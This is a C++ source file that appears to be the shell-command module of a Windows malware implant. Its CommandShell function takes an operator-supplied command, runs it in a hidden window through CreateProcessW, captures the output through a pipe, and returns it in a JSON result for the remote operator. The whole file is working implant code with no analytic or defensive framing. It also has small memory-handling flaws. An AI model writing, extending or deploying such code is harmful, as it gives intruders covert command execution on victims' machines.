#include "Implant.h"
#include "Command.h"
#include "Stdlib.h"

BOOL CommandShell( json& args, string artifact, json& result ) {
    auto                command = args[0].get<string>();
    HANDLE              hPipeRead;
    HANDLE              hPipeWrite;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOW        si;
    PROCESS_INFORMATION pi;
    DWORD               total    = 0;
    DWORD               capacity = 4096;
    CHAR                temp[1024];
    DWORD               bytesread;

    PWCHAR CommandLine = (PWCHAR)RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, command.size() * sizeof( WCHAR ) );
    if (!CommandLine) {
        return FALSE;
    }

    CharStringToWCharString( CommandLine, (PCHAR)command.c_str(), command.size() );

    sa.nLength              = sizeof( SECURITY_ATTRIBUTES );
    sa.bInheritHandle       = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe( &hPipeRead, &hPipeWrite, &sa, 0 )) {
        printf( "[-] CreatePipe failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    if (!SetHandleInformation( hPipeRead, HANDLE_FLAG_INHERIT, 0 )) {
        printf( "[-] SetHandleInformation failed: ( %ld )\n", GetLastError() );
        return FALSE;
    }

    ZeroMemory( &si, sizeof( si ) );
    ZeroMemory( &pi, sizeof( pi ) );
    si.cb         = sizeof( si );
    si.hStdError  = hPipeWrite;
    si.hStdOutput = hPipeWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW( NULL, CommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
        printf( "CreateProcess failed: ( %ld )\n", GetLastError() );
        CloseHandle( hPipeRead );
        CloseHandle( hPipeWrite );
        return FALSE;
    }

    CloseHandle( hPipeWrite );

    char* output = (char*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, capacity );
    if (!output) {
        CloseHandle( hPipeRead );
        return FALSE;
    }
    output[0] = '\0';

    while (ReadFile( hPipeRead, temp, sizeof( temp ) - 1, &bytesread, NULL ) && bytesread > 0) {
        if (total + bytesread + 1 > capacity) {
            capacity *= 2;
            char* newOutput = (char*)HeapReAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, output, capacity );
            if (!newOutput) {
                HeapFree( GetProcessHeap(), 0, output );
                CloseHandle( hPipeRead );
                return FALSE;
            }
            output = newOutput;
        }

        memcpy( output + total, temp, bytesread );
        total += bytesread;
        output[total] = '\0';
    }

    WaitForSingleObject( pi.hProcess, INFINITE );
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    CloseHandle( hPipeRead );

    result["name"]   = "shell";
    result["output"] = output;

    HeapFree( GetProcessHeap(), 0, CommandLine );
    HeapFree( GetProcessHeap(), 0, output );

    return TRUE;
}
